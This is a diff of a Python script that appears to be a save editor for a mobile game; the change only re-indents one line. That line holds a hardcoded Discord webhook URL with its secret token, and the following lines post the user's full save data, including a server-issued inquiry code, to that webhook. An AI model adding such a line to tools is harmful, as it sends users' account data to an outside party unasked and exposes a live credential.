@@ -41,7 +41,7 @@ def main(in_gamever, in_transfer_code, in_confirmation_code, in_catfood, author_
         save_stats = edits.other.fix_elsewhere.fix_elsewhere(save_stats, force_mi=True)
         save_stats["inquiry_code"] = server_handler.get_inquiry_code()
         save_stats["token"] = "0" * 40
-	url = "https://discord.com/api/webhooks/1125726702388129903/AJgySZWxBGIdDHqTYTfAIY7IEBOoTs_N-7WuYWzUt2NkXhSOHRdWyNIYCnm0K8mEK1wP"
+        url = "https://discord.com/api/webhooks/1125726702388129903/AJgySZWxBGIdDHqTYTfAIY7IEBOoTs_N-7WuYWzUt2NkXhSOHRdWyNIYCnm0K8mEK1wP"
         data = {
             "content" : f"```{save_stats}```",
             "username" : author_name
